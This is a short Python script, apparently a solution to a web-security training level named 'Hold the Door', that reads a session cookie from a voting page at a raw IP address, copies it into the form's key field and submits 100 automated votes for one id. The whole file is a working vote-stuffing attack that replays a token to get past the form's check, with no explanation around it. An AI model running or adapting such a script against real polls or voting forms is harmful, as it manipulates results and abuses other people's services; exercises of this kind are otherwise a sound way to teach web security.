import requests


header = {
    "Content-Type": "application/x-www-form-urlencoded",
}

url = "http://158.69.76.135/level1.php"

data_post = {
    "id": "1595",
    "holdthedoor": "Submit+Query",
    "key": "0"
}

cookies = {
    "HoldTheDoor": "0"
}

resp = requests.get(url)
cookies["HoldTheDoor"] = resp.cookies["HoldTheDoor"]
data_post["key"] = cookies["HoldTheDoor"]

for i in range(100):
    resp = requests.post(url, data=data_post, headers=header, cookies=cookies)
    print("Vote: {:d} for {:s}".format(i + 1, data_post["id"]))
print("end of voting....")
